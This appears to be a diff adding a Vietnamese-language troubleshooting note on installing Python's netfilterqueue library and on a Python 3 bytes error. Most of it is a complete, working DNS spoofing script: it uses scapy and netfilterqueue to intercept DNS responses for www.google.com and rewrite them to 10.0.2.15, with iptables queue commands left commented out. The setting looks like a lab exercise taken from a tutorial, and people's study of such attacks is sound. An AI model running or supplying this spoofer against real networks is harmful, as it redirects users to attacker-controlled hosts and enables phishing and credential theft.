@@ -1,0 +1,71 @@
+VẤN ĐỀ 1: NetfilterQueue không cài đặt
+
+VẤN ĐỀ 2: Không tìm thấy thuộc tính set_payload ()
+
+
+
+GIẢI PHÁP 1:
+
+Nếu trước đây bạn đã cài đặt bất kỳ phiên bản netfilterqueue nào, hãy xóa chúng bằng cách sử dụng 'pip unistall pkg_name'.
+
+Sau đó đặt các lệnh dưới đây để cài đặt phiên bản netfilterqueue hoạt động cho python3:
+
+>> apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
+
+>> pip3 install -U git+https://github.com/kti/python-netfilterqueue
+
+
+
+TÍN DỤNG: Để sửa chương trình netfilter: - http://www.github.com/kti/python-netfilterqueue/issues/53
+
+
+
+
+
+GIẢI PHÁP 2:
+
+Tham khảo: Set_payload (byte) chấp nhận các byte không phải chuỗi trong phiên bản python3 của netfilter.
+
+
+# ************************MY CODE**************************
+import netfilterqueue
+import scapy.all as scapy
+import os
+
+# os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
+# os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
+
+def process_packet(packet):
+	scapy_packet = scapy.IP(packet.get_payload())
+	if scapy_packet.haslayer(scapy.DNSRR):
+		qname = scapy_packet[scapy.DNSQR].qname
+		# print(qname)
+		if b'www.google.com' in qname:
+			print('[+] Spoofing DNS Response')
+			answer = scapy.DNSRR(rrname=qname, rdata='10.0.2.15')
+			scapy_packet[scapy.DNS].an = answer
+			scapy_packet[scapy.DNS].ancount = 1
+
+			del scapy_packet[scapy.IP].len
+			del scapy_packet[scapy.IP].chksum
+			del scapy_packet[scapy.UDP].len
+			del scapy_packet[scapy.UDP].chksum
+
+			packet.set_payload(bytes(scapy_packet))
+	packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0,process_packet)
+queue.run()
+# os.system('iptables --flush')
+
+
+TÍN DỤNG: Để sửa tập lệnh netfilter: - http://www.thepythoncode.com/article/make-dns-spoof-python (bạn cũng có thể tìm thấy phiên bản python 3 của chương trình arp_spoof và packet_sniffer trong các liên kết bên dưới)
+
+
+
+
+#############################
+QUAN TRONG
+#############################
+Compiling netfilterqueue for python3.9 is a bit tricky, you have to clone the github repo (netfilterqueue repo I mean) and then open netfilterqueue.c and repalce all the instance of tp_rpint to tp_vectorcall_offset, then compile according to the github repo instructions and it will be installed.
